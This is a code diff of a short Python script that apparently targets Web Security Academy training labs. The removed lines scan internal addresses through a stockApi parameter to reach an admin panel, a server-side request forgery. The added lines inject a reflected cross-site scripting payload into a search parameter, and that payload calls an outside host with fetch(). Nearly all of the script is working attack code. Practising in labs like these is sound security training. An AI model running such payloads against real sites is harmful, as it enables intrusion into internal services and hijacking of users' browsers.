@@ -1,21 +1,13 @@
 import requests
 from urllib.parse import quote
-base_url = 'https://0aad00dd0390770880f635a200820065.web-security-academy.net/product/stock'
-results = []
-for i in range(1, 256):
-    ip = f'192.168.0.{i}'
-    target_url = f'http://{ip}:8080/admin'
-    payload = quote(target_url)
-    data = {'stockApi': payload}
-    response = requests.post(base_url, data=data)
-    
-
-    # print the status_code and len(response.text) as instructed
-    print(f'{ip}: ({response.status_code}, {len(response.text)})')
-    print(response.text)
-    results.append((ip, response.status_code, len(response.text)))
-    # Early stop if found 200
-    if response.status_code == 200:
-        break
-# No answer for this step
-answer = None
+base_url = 'https://0aa4002104b02ebd82794c3900e80062.web-security-academy.net/'
+payload = '"><script>fetch("https://cowboy.rocks/xss/target/1")</script>'
+url = f"{base_url}?search={quote(payload)}"
+print(url)
+response = requests.get(url)
+print((response.status_code, len(response.text)))
+# Optionally check for lab-solved banner
+if 'is-solved' in response.text or 'Solved' in response.text:
+    print("[+] Lab appears to be solved!")
+else:
+    print("[-] Lab not solved yet.")
